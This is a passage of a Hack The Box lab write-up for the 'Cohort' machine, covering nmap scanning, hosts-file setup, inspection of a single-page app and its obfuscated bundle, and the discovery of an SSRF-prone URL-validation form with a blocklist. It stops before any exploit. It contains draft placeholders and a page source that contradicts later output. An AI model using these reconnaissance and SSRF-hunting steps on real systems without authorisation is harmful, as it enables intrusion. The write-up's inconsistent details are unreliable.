---
link: https://app.hackthebox.com/machines/Cohort
difficulty: Easy
os: Linux
team: red
release date: 2026-08-01
tags:
  - SN_11
image: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1fb351c-6269-49cd-8789-fc579a687c97-1781002999.png
solved:
solve date:
machine no.: 11
---

<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/writeup_hack_the_box_logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">Cohort Writeup</p></div>

  <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1fb351c-6269-49cd-8789-fc579a687c97-1781002999.png" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 22px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: <a href="https://app.hackthebox.com/users/1809572">nedmoeca</a></p>
    <p style="margin: 0;">Author(s): <a href="https://app.hackthebox.com/users/114053">TheCyberGeek</a></p>
    <p style="margin: 0;">Difficulty: Easy/Medium/Hard/Insane</p>
    <p style="margin: 0;">Date: DD Month Year</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Summary

Category: **Web**, with a secondary **Linux exploitation / CVE-chaining** component. Web comes first and is what gets you inside.

It fits Web because the entire foothold hinges on a server-side request forgery in the public portal: a user-supplied URL field that the application fetches on your behalf, with a blocklist filter that can be walked around. That SSRF is not just a proof-of-concept, it's the only way to see a service that is bound to loopback and invisible to any external port scan, and it's how you recover the hostname that makes the actual exploit reachable. Once you have a shell, the box shifts character entirely: the escalation is a known local privilege-escalation CVE against a system daemon, which is a different skill from the web work that got you there.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery
### 1.1 Connect to Hack The Box

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

Start the Machine.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.2 Store the target address in a shell variable

**Command:**

```bash
IP=TARGET_IP
echo $IP
```

To clear the variable:

```bash
unset IP
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.3 Verify Target is Reachable

Verify that the target machine is up and reachable by performing an ICMP ping test.

**Command:** `ping -c 4 TARGET_IP`

**Breakdown:**

- `-c 4` → sends 4 packets only (clean output, fast)

**Result:**

```shell
┌──(nedmoeca㉿kali)-[~/Labs/HTB/SN11/Cohort]
└─$ ping -c 4 $IP
PING TARGET_IP (TARGET_IP) 56(84) bytes of data.
64 bytes from TARGET_IP: icmp_seq=1 ttl=63 time=216 ms
64 bytes from TARGET_IP: icmp_seq=2 ttl=63 time=216 ms
64 bytes from TARGET_IP: icmp_seq=3 ttl=63 time=220 ms
64 bytes from TARGET_IP: icmp_seq=4 ttl=63 time=248 ms

--- TARGET_IP ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 215.758/224.955/248.315/13.586 ms
```

A successful response confirms that the machine is active and accessible on the HTB network, allowing us to proceed with the enumeration phase.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.4 Port Scan with Nmap

Before we can attack a system, we need to find out what "doors" are open. Doors in this context are ports. We use a tool called **Nmap** (Network Mapper) to scan the target's IP address and see what services are running.

#### 1.4.1 Full Port Sweep

Begin enumeration by discovering every open port on the target. Run a fast scan across all 65,535 ports to build a complete picture of the attack surface before committing to deeper inspection.

Begin enumeration by discovering every open port on the target. Run a fast scan across all 65,535 ports to build a complete picture of the attack surface before committing to deeper inspection.

**Command:** `nmap -p- --min-rate 5000 -Pn TARGET_IP | grapo`

**Breakdown:**

| Component         | Purpose             | Simple Explanation                                                                                                                                                                                                                                 |
| ----------------- | ------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `nmap`            | Port scanner        | Sends packets to each port and classifies the response as open, closed, or filtered.                                                                                                                                                               |
| `-p-`             | Port range          | Shorthand for ports 1–65535. Without it nmap checks only its built-in list of 1000 common ports.                                                                                                                                                   |
| `--min-rate 5000` | Timing floor        | Forces at least 5000 packets per second instead of letting nmap's adaptive timing throttle down. This is what makes a full-range scan finish in seconds rather than minutes. Note the **double** dash.                                             |
| `-Pn`             | Skip host discovery | Treats the host as up without pinging first. HTB machines commonly drop ICMP; without this, nmap may conclude the host is down and scan nothing.                                                                                                   |
| `\| grapo`        | Custom filter       | Local zsh function: `tee /dev/tty \| grep -oP '^\d+(?=/tcp\s+open)' \| paste -sd, \| sed 's/^/\n/'`. Prints the full nmap output to the terminal while extracting open port numbers into a comma-separated list ready to paste into the next scan. |

**Result:**

```shell
┌──(nedmoeca㉿kali)-[~/Labs/HTB/SN11/Cohort]
└─$ nmap -p- --min-rate 5000 -Pn $IP | grapo
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-09 00:23 -0400
Nmap scan report for TARGET_IP
Host is up (0.23s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 24.26 seconds

22,80,443
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 1.4.2 The "Deep Dive" Scan (Targeted Aggression)

**Command:** `nmap -A -p p1,p2,p3,p4 TARGET_IP`

**Breakdown:**

- **`-A`**
    - **Description:** Aggressive Scan Mode.
    - **Purpose:** Enables OS detection, version detection, script scanning (`-sC`), and traceroute all at once.
- `-p`
    - **Description:** Targeted Port List.
    - **Purpose:** Restricts the heavy scanning to only the ports you confirmed are open, saving significant time and processing power.


**Result:**

```shell
┌──(nedmoeca㉿kali)-[~/Labs/HTB/SN11/Cohort]
└─$ nmap -A -p 22,80,443 $IP                
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-09 00:26 -0400
Nmap scan report for TARGET_IP
Host is up (0.17s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://cohort.htb/
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://cohort.htb/
| ssl-cert: Subject: commonName=cohort.htb/organizationName=Cohort Analytics
| Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb
| Not valid before: 2026-06-01T18:47:07
|_Not valid after:  2126-05-08T18:47:07
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   217.08 ms 10.10.14.1
2   217.22 ms TARGET_IP

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.68 seconds
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 1.4.3 Scan Results Analysis

| Port | Service | Version                           | Analysis                                                                                                                                       | Simple Explanation                                                                                                                      |
| ---- | ------- | --------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| 22   | SSH     | OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 | Current release shipped with Ubuntu 24.04. No known pre-auth RCE. Only useful with harvested credentials or keys.                              | Remote login service. Nothing to attack without a username and password or key, but it becomes a way in the moment either is recovered. |
| 80   | HTTP    | nginx 1.24.0 (Ubuntu)             | Redirects to `https://cohort.htb/`. Serves no content of its own; exists to push clients to TLS.                                               | The plain web port just forwards you to the secure one. Nothing to attack here directly.                                                |
| 443  | HTTPS   | nginx 1.24.0 (Ubuntu)             | Primary application entry point. Certificate names `cohort.htb` with a wildcard SAN. nginx is acting as a reverse proxy, not an origin server. | The real website. The certificate hints there are other sites hiding behind this same door, reachable by name.                          |
**Next:**  
The application answers to a hostname rather than an IP. Add local name resolution for `cohort.htb` and confirm the web application responds before enumerating its content.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.5 Resolve the application hostname locally

**Why this step:**  
We've established that nginx routes by `Host` header and that port 80 redirects to `https://cohort.htb/`. Requests sent to the bare IP reach only the default site. Local name resolution is a prerequisite for reaching the application at all.

**Command:**

```bash
sudo vi /etc/hosts
# Append the following line:
# TARGET_IP  cohort.htb

cat /etc/hosts
```

**Breakdown:**

|Component|Purpose|
|---|---|
|`/etc/hosts`|Static hostname-to-IP mapping file, consulted by the resolver **before** DNS on a default Linux configuration. Entries here override any DNS answer.|
|`sudo`|The file is root-owned; editing requires elevation.|
|`vi`|Text editor. Any editor works; `echo "TARGET_IP cohort.htb" \| sudo tee -a /etc/hosts` achieves the same result non-interactively.|
|`cat /etc/hosts`|Verification step. Confirms the entry was written and no existing line was overwritten.|

###### Why a hosts entry is required rather than optional:

HTB target hostnames such as `cohort.htb` do not exist in public DNS. A browser or `curl` given that hostname will attempt resolution, fail, and never send a packet.

The mapping matters for a second, less obvious reason. When nginx serves multiple virtual hosts on one IP, it selects the backend using the `Host` header of the HTTP request (and the SNI field of the TLS handshake). Both are populated from the hostname the client was given not from the IP it connected to. Browsing `https://TARGET_IP/` therefore sends `Host: TARGET_IP`, matching no configured vhost, and nginx falls through to its default server block.

Adding the hosts entry lets the client send `Host: cohort.htb`, which nginx routes to the intended application. 

**Result:**

```
┌──(nedmoeca㉿kali)-[~/Labs/HTB/SN11/Cohort]
└─$ cat /etc/hosts
...
TARGET_IP  cohort.htb
```

**Next:**  
Name resolution is in place. Load the application in a browser and read its content for descriptions of functionality that indicate attack surface.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 2. Enumeration

### 2.1 Review the public landing page for described functionality

**Command:**

```bash
# Browse to the application:
firefox https://cohort.htb/
```

Accept the self-signed certificate warning. The certificate observed in the deep scan is issued for `cohort.htb` by an untrusted authority, which is expected on this target.

**Result:**

![[cohort_landing_page.png]]

Site branding: **Cohort Analytics**, a subscription-retention analytics consultancy. Page sections: Services, Approach, Results, Team.

Navigation and calls to action:

|Element|Location|Destination|
|---|---|---|
|Services / Approach / Results / Team|Header nav|In-page anchors on the landing page|
|Client Insights|Header, top right|Separate application (repeated as a CTA)|
|Open Client Insights|Hero section, and footer CTA block|Same destination as above|
|How we work|Hero section|In-page anchor|

Service descriptions listed under "What we do":

| No. | Service                        | Description as published                           | Relevance                                             |
| --- | ------------------------------ | -------------------------------------------------- | ----------------------------------------------------- |
| 01  | Cohort and retention modelling | Rebuilds retention curves from raw events          | Data processing; no user-supplied endpoint implied    |
| 02  | Churn forecasting              | Survival models scored against revenue             | No external input implied                             |
| 03  | Activation analytics           | Traces first-30-day paths                          | No external input implied                             |
| 04  | Reporting that gets read       | Dashboards refreshed on a schedule                 | Implies scheduled server-side jobs                    |
| 05  | **Source review**              | **Validates every feed the client points them at** | **Server fetches a client-nominated remote resource** |

Process steps published under "We work in the open":

- **A** - Connect a warehouse or a read-only export, and agree what a retained account means.
- **B** - Reconcile the raw feed against billing.
- **C** - Model, review together, and hand back the notebook.

**What this gives you:**

**Key finding: service 05 and process step A both describe the server retrieving a resource at a URL the client supplies.** Phrases such as "every feed you point us at" and "connect your warehouse" describe outbound server-initiated requests driven by user-controlled input. Where an application fetches an address chosen by an untrusted party, the address may be redirected toward the server's own internal network rather than an external data source which is the precondition for Server-Side Request Forgery.

Supporting observations:

- The "Client Insights" call to action appears three times (header, hero, footer) and is the only element linking away from the landing page. This is the application proper; the landing page is static content.
- Process step C mentions handing back "the notebook," implying a notebook application exists somewhere in the environment.
- Named personnel: Mara Quinteros (Founder) and Devin Oyelaran (Analytics engineering). Retain as potential usernames.

**Ruled out:** The landing page itself as an attack surface. It exposes no input fields, no authentication, and no dynamic content.

**Next:**  
The copy identifies a URL-fetching feature but not its location. Extract every link and form target referenced in the page source to map available paths before following the visible call to action.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.2 Retrieve the page source and identify the application architecture

**Why this step:**  
The landing page reviewed in 2.1 displays multiple navigation links and repeated "Client Insights" calls to action. Extract those link targets from the source to enumerate every referenced path, including any not surfaced in the rendered layout.

**Command:**

```bash
curl -sk https://cohort.htb/ | grep -oiE 'href="[^"]*"|action="[^"]*"' | sort -u
```

**Breakdown:**

|Component|Purpose|
|---|---|
|`curl`|Command-line HTTP client. Retrieves the raw response body without rendering it.|
|`-s`|Silent. Suppresses the transfer progress meter, which would otherwise pollute piped output.|
|`-k`|Permit insecure TLS. The target presents a self-signed certificate; without this flag curl aborts the connection with a verification error.|
|`grep -o`|Print only the matching portion of each line, not the whole line. Necessary because minified or single-line HTML would otherwise return the entire document.|
|`-i`|Case-insensitive. HTML attribute names are case-insensitive; `HREF` and `href` are equivalent.|
|`-E`|Extended regular expressions, enabling the `\|` alternation used here.|
|`'href="[^"]*"\|action="[^"]*"'`|Matches link destinations and form submission targets. `[^"]*` captures everything up to the closing double quote. Note this pattern matches **double-quoted attributes only**.|
|`sort -u`|Sort and deduplicate. Repeated navigation links appear once.|

**Result:**

```
href="/assets/styles.css"
```

**Analysis:**

The output contradicts the rendered page. The browser displayed at least four navigation anchors and three separate "Client Insights" buttons; the source contains one link, to a stylesheet. Investigate the discrepancy rather than adjusting the pattern blindly:

```bash
┌──(nedmoeca㉿kali)-[~/Labs/HTB/SN11/Cohort]
└─$ curl -sk https://cohort.htb/ | wc -c
908

┌──(nedmoeca㉿kali)-[~/Labs/HTB/SN11/Cohort]
└─$ curl -sk https://cohort.htb/ | grep -i -o -E '.{0,60}insight.{0,60}'
```

The second command returns nothing. The response is 908 bytes and contains no occurrence of "insight" in any case. Retrieve the headers and full body:

```bash
curl -sk -D - https://cohort.htb/ -o /dev/null
```

|Flag|Purpose|
|---|---|
|`-D -`|Dump response headers to the file given; `-` means standard output.|
|`-o /dev/null`|Discard the body, isolating the headers.|

```bash
┌──(nedmoeca㉿kali)-[~/Labs/HTB/SN11/Cohort]
└─$ curl -sk -D - https://cohort.htb/ -o /dev/null
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Wed, 09 Sep 2026 05:11:41 GMT
Content-Type: text/html
Content-Length: 908
Last-Modified: Mon, 01 Jun 2026 20:53:47 GMT
Connection: keep-alive
ETag: "6a1df15b-38c"
Accept-Ranges: bytes
```

**View Page Source:**

```html
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Client Insights - Cohort Analytics</title>
<meta name="description" content="Client Insights - register and validate a report source URL.">
<link rel="stylesheet" href="/assets/styles.css">
</head>
<body>
<div id="app" data-page="portal" aria-busy="true">
  <div class="boot"><span class="boot-mark" aria-hidden="true"></span><span>Loading Client Insights</span></div>
</div>
<noscript>
  <div style="max-width:640px;margin:18vh auto;padding:0 24px;font-family:system-ui,sans-serif;color:#15181d;text-align:center;">
    <h1 style="font-size:1.4rem;">JavaScript required</h1>
    <p style="color:#4a5159;">Client Insights runs in your browser. Please enable JavaScript to continue.</p>
  </div>
</noscript>
<script src="/assets/app.js" defer></script>
</body>
</html>
```
<div align="center">
<br>
<br>
</div>

###### Theory: single-page applications and why curl sees a different site than the browser:

In a traditional web application the server assembles complete HTML for each page and sends it to the client. Requesting the page with curl yields the same markup a browser would render, so links, forms, and text are all directly greppable.

A single-page application inverts all that. The server sends a minimal shell and here, it's the `<div id="app">` placeholder, a loading indicator, and a `<script>` tag and the browser then executes the referenced JavaScript, which constructs the interface, fetches data from API endpoints, and handles navigation internally. The 908-byte response is the entire server-rendered document; everything visible in the screenshot was generated after that document loaded.

Three diagnostic signals identify the pattern in the output above:

- A container element that is empty apart from placeholder text (`aria-busy="true"`, "Loading Cohort Analytics").
- A `<noscript>` block stating the application requires JavaScript: the developer explicitly handling clients that behave the way curl does.
- A `Content-Length` far smaller than the rendered page could account for.

The consequence for enumeration is a redirection of effort rather than an obstacle. Because navigation is implemented in JavaScript, route names and API endpoints are string literals inside the script bundle. That bundle typically references **every** route the application supports, including paths with no visible link, administrative endpoints, and backend API URLs. Reading it enumerates more of the application than clicking through the rendered interface would.

Note also that the original grep pattern matched only double-quoted attributes. Single-quoted (`href='/path'`) and unquoted attributes would have been missed. That limitation is not the cause here. The links genuinely are absent from the source but it is a routine source of false negatives when parsing HTML with regular expressions.

**What this gives you:**

**Key findings:**

- The application is a JavaScript single-page application. The server returns a 908-byte shell; all interface content is rendered client-side.
- Static analysis of the landing page HTML yields no application routes. Route enumeration must target the JavaScript bundle instead.
- One script is referenced: `/assets/app.js`. This is the sole client-side entry point and therefore contains the application's routing logic.
- `Last-Modified` on the shell is 2026-06-01, matching the TLS certificate issue date from 1.4.2. Consistent with a purpose-built deployment.
- No `Set-Cookie` header is returned on the landing page, indicating no session is established for anonymous visitors.

**Ruled out:** HTML-based link extraction as an enumeration method for this target.

**Next:**  
Application routes reside in the client-side bundle. Retrieve `/assets/app.js` and extract path strings to map the full set of endpoints, including any not linked from the rendered interface.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.3 Retrieve the client bundle and identify obfuscation

**Why this step:**  
Section 2.2 established that the application renders client-side and that `/assets/app.js` is the sole script referenced. Application routes and API endpoints exist as string literals in that bundle. Retrieve it and extract path strings.

**Command:**

```bash
curl -sk https://cohort.htb/assets/app.js -o app.js
wc -c app.js
grep -oiE '"/[a-z0-9_./?=-]*"' app.js | sort -u
```

**Breakdown:**

|Component|Purpose|
|---|---|
|`-o app.js`|Write the response body to a local file rather than standard output. Allows repeated analysis without refetching, and keeps a copy of the artifact as evidence.|
|`wc -c`|Count bytes. Sizes the file before analysis: a few kilobytes suggests readable hand-written source; hundreds of kilobytes suggests bundled or minified output requiring a different approach.|
|`grep -o`|Print only matched text, not the full line. Essential here — minified bundles are frequently one enormous line.|
|`'"/[a-z0-9_./?=-]*"'`|Matches a double-quoted string beginning with `/`, the conventional shape of a path literal. The character class covers letters, digits, and the punctuation valid in URL paths and query strings.|
|`sort -u`|Deduplicate. A route referenced in ten places appears once.|

**Result:**

```bash
┌──(nedmoeca㉿kali)-[~/Labs/HTB/SN11/Cohort]
└─$ curl -sk https://cohort.htb/assets/app.js -o app.js

┌──(nedmoeca㉿kali)-[~/Labs/HTB/SN11/Cohort]
└─$ ls
app.js

┌──(nedmoeca㉿kali)-[~/Labs/HTB/SN11/Cohort]
└─$ wc -c app.js
122962 app.js

┌──(nedmoeca㉿kali)-[~/Labs/HTB/SN11/Cohort]
└─$ grep -oiE '"/[a-z0-9_./?=-]*"' app.js | sort -u
```

The `grep` returns no output.

**Analysis:**

A 123 KB single-page-application bundle that references no paths is not plausible. As in 2.2, treat an entirely empty result as evidence of a pattern mismatch rather than an absence of data, and inspect the file before adjusting the pattern:

```bash
head -c 600 app.js
grep -c "'" app.js
```

```bash
┌──(nedmoeca㉿kali)-[~/Labs/HTB/SN11/Cohort]
└─$ head -c 600 app.js
(function(_0x25ef22,_0x5d3a1a){var _0x2ec8f9=a0_0x41a8,_0x5e6aa1=_0x25ef22();while(!![]){try{var _0xd50d27=parseInt(_0x2ec8f9(0x74e,'ugVw'))/0x1+-parseInt(_0x2ec8f9(0x662,'1EKa'))/0x2*(parseInt(_0x2ec8f9(0x178,'6TP2'))/0x3)+parseInt(_0x2ec8f9(0x581,'%yEn'))/0x4+-parseInt(_0x2ec8f9(0xcaf,'x#6]'))/0x5*(-parseInt(_0x2ec8f9(0xb8d,'Y)[Q'))/0x6)+-parseInt(_0x2ec8f9(0x3fa,'kxTR'))/0x7*(-parseInt(_0x2ec8f9(0x77d,'@Z2e'))/0x8)+parseInt(_0x2ec8f9(0x665,']%Lb'))/0x9+parseInt(_0x2ec8f9(0x6c3,'zUwL'))/0xa*(-parseInt(_0x2ec8f9(0x2d7,'$9sa'))/0xb);if(_0xd50d27===_0x5d3a1a)break;else _0x5e6aa1['push'](_0x5e6a                                                                                                                                                           
┌──(nedmoeca㉿kali)-[~/Labs/HTB/SN11/Cohort]
└─$ grep -c "'" app.js
1
```
<div align="center">
<br>
<br>
</div>

###### Theory: string-array obfuscation and why grep cannot defeat it:

The bundle has been processed by a JavaScript obfuscator (the structure matches obfuscator.io defaults). Four characteristics are visible in the excerpt above:

- **Identifier mangling.** Variable and function names are replaced with generated hex-suffixed names such as `_0x25ef22` and `a0_0x41a8`, removing all semantic meaning.
- **Numeric literals in hexadecimal.** `0x1`, `0x74e`, `0xcaf` instead of decimal, defeating searches for recognisable constants such as port numbers.
- **Boolean and control-flow obfuscation.** `!![]` evaluates to `true`; the surrounding `while`/`try` construct is a self-defending integrity check that scrambles the string array until an arithmetic checksum matches.
- **String-array encoding.** This is the decisive one. Every string literal in the original program is extracted into a single array, encoded, and replaced at its usage site with a decoder call of the form `_0x2ec8f9(index, key)` — for example `_0x2ec8f9(0x74e,'ugVw')`.

The consequence is that no plaintext string survives in the file. A route such as `/portal.html` is not stored as those characters anywhere; it exists only as an encoded array entry that the decoder reconstructs at runtime. Searching the file for `href`, `/api`, `fetch`, or any path fragment returns nothing, and no refinement of the regular expression changes that. The target text is not present to be matched.

Two options follow. Deobfuscate statically: the decoder is self-contained and can be extracted and executed under Node.js to dump the full string array, recovering every literal at once. Or observe dynamically: obfuscation conceals code from a human reader but not from the JavaScript engine, which must decode every string in order to run. Loading the page in a browser with developer tools open reveals the resolved URLs in the network log. The dynamic approach is faster and requires no reverse engineering; the static approach is more thorough and surfaces routes the application never requests unprompted.

Note separately that `grep -c` counts **matching lines**, not occurrences. Because the entire bundle is one line, `grep -c` on this file can only return `0` or `1` and conveys no useful frequency information. Use `grep -o PATTERN file | wc -l` to count occurrences in minified sources.

**What this gives you:**

**Key findings:**

- `/assets/app.js` is 122,962 bytes and obfuscated using string-array encoding with identifier mangling, hex literals, and a self-defending checksum loop.
- No plaintext routes, endpoints, or paths exist in the bundle. Static string extraction is not viable against this file without first deobfuscating it.
- Route discovery must proceed dynamically by observing the requests the application issues at runtime, or statically by executing the extracted decoder to dump the string array.

**Ruled out:** Direct pattern-matching of the client bundle as a route-enumeration method.

**Evidence limitation:** A backtick-delimiter count was attempted but the executed command repeated the single-quote pattern, so no backtick data was captured. The result is not material — string-array obfuscation removes plaintext literals regardless of the delimiter originally used.

**Next:**  
The runtime resolves every obfuscated string in order to function. Load the application in a browser with the network log capturing, follow the "Client Insights" call to action, and record the resulting document and API requests.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.4 Enumerate routes dynamically via the browser network log

**Why this step:**  
The client bundle is obfuscated (2.3), so route strings cannot be extracted statically. The JavaScript engine must decode those strings to run, so observing the application's runtime requests recovers the same routes without reverse engineering.

**Steps:**

```
1. Browse to https://cohort.htb/
2. Open developer tools (F12) and select the Network tab
3. Reload the page (Ctrl+R) so capture begins before the bundle executes
4. Click the "Open Client Insights" call to action
5. Record every request of type document, xhr, or fetch
```

**Result:**

![[portal_devtools_network.png.png]]

Address bar after the click: `https://cohort.htb/portal.html`

Captured requests:

|Name|Status|Type|Initiator|Size|
|---|---|---|---|---|
|`portal.html`|200|document|Other|0.8 kB|
|`styles.css`|200|stylesheet|`portal.html:8`|memory cache|
|`app.js`|200|script|`portal.html:20`|memory cache|
|`config.json`|200|fetch|`picture-in-picture.js:262`|1.3 kB|

Page content at `/portal.html`: heading **"Register a report source URL"**, described as: point the application at a data feed and it fetches the feed once to confirm reachability and returns a recognised format. Validated sources are queued for reconciliation against a billing export.

Form fields:

|Field|Type|Placeholder / Default|Helper text|
|---|---|---|---|
|Source URL|text input|`https://reports.example.htb/exports/retention.csv`|"The endpoint we should fetch. Public report endpoints only."|
|Expected format|select|`CSV`|"Used to sanity-check the response before reconciliation."|
|Validate source|submit button|—|—|

Published validation behaviour:

- The endpoint resolves and responds within a few seconds.
- Response status and content type resemble a genuine export.
- A short preview of the response is captured and shown back to the user.

Published security notes:

- Internal and loopback addresses are rejected.
- Credentials in the URL are not stored; a signed link or allow-listed IP is recommended.
- Validation does not import data; reconciliation is a separate scheduled step.

###### Theory — why runtime observation defeats client-side obfuscation:

Obfuscation is a barrier to human reading, not to execution. Whatever transformation is applied to the source, the browser must ultimately produce a real URL string and hand it to the network stack, because the server understands only plaintext HTTP. The Network panel taps that output stage, after every decoder has run.

This inverts the usual relationship between the two analysis methods. Against readable source, static analysis is superior — it reveals every route in the program, including ones never exercised. Against obfuscated source, static analysis costs significant effort while dynamic observation costs one keypress. The trade-off is coverage: the network log shows only routes the application actually requested during the session, so paths reachable solely through unexercised code, error handlers, or privileged flows remain hidden. Dynamic observation is the fast first pass, not a complete enumeration.

The `Initiator` column is worth reading rather than skipping. It records what caused each request. Here, `portal.html:8` and `portal.html:20` are ordinary tag references, but `config.json` is initiated by JavaScript at `picture-in-picture.js:262` — a request generated by code, with no corresponding link or visible element in the interface. Requests of this kind are exactly what a rendered-page review misses.

**What this gives you:**

**Key findings:**

- **The application at `/portal.html` accepts a user-supplied URL and fetches it server-side.** Its own description — the server retrieves the nominated endpoint, checks the response status and content type, and returns a preview of the body to the requesting user — matches the definition of Server-Side Request Forgery, with response content reflected back to the attacker.
- **A blocklist filter is in place**, documented as rejecting internal and loopback addresses. Blocklist enforcement constrains input by enumerating forbidden values, which requires the filter to anticipate every alternative encoding of those values. Where an allowlist fails closed, a blocklist fails open.
- **The response preview is returned to the user**, making this a _full-read_ SSRF rather than a blind one. Content from internal services is directly observable, permitting enumeration rather than only inference from timing or error behaviour.
- **`/config.json` exists and is fetched by JavaScript at runtime.** It is 1.3 kB, is not linked in the interface, and its contents are not displayed on the page.
- The `Expected format` selector constrains what the application accepts as a valid response and may govern how strictly the preview is parsed.

**Ruled out:** Static analysis of the client bundle. Runtime observation recovered the route in a single page load.

**Next:**  
The network log exposed a configuration file the interface never surfaces. Retrieve `/config.json` before interacting with the form, in case it documents endpoints, filter behaviour, or backend addresses.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.5 Attempt direct retrieval of the runtime configuration file

**Why this step:**  
The network log in 2.4 recorded a 1.3 kB JavaScript-initiated fetch of `config.json` that the interface never displays. Retrieve it directly to inspect any endpoints or filter behaviour it documents.

**Command:**

bash

```bash
curl -sk https://cohort.htb/config.json
```

**Result:**

html

```html
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Cohort Analytics</title>
<meta name="description" content="Cohort Analytics - retention intelligence for subscription teams.">
<link rel="stylesheet" href="/assets/styles.css">
</head>
<body>
<div id="app" data-page="home" aria-busy="true">
  <div class="boot"><span class="boot-mark" aria-hidden="true"></span><span>Loading Cohort Analytics</span></div>
</div>
<noscript>
  <div style="max-width:640px;margin:18vh auto;padding:0 24px;font-family:system-ui,sans-serif;color:#15181d;text-align:center;">
    <h1 style="font-size:1.4rem;">JavaScript required</h1>
    <p style="color:#4a5159;">The Cohort Analytics workspace runs in your browser. Please enable JavaScript to continue.</p>
  </div>
</noscript>
<script src="/assets/app.js" defer></script>
</body>
</html>
```

**Analysis:**

The response is the 908-byte application shell from 2.2, not JSON. `/config.json` does not exist at the web root.

###### Theory — SPA fallback routing and why HTTP status codes stop being reliable:

A single-page application handles navigation in the browser. Requesting `https://cohort.htb/settings` directly must still return the shell, so the client bundle can load and render the settings view itself. Serving a 404 would break every bookmark and page refresh.

nginx implements this with a directive of the form:

nginx

```nginx
location / {
    try_files $uri $uri/ /index.html;
}
```

Each request is tested against a real file, then a real directory, and if neither exists the shell is served with **HTTP 200**. The fallback is unconditional, so every nonexistent path on the site returns 200 and identical content.

Two consequences shape the rest of the enumeration:

- **Status codes carry no information about existence.** A directory brute-forcer configured to treat 200 as a hit will report every word in its list as valid. Filtering must be done on response size or body content — here, any response of exactly 908 bytes matching the shell is a miss.
- **A wrong path and a real path are visually indistinguishable** unless the real path serves a genuine file. Absence of the shell is the positive signal.

**What this gives you:**

**Key findings:**

- `/config.json` is not served from the web root; the request falls through to the SPA shell.
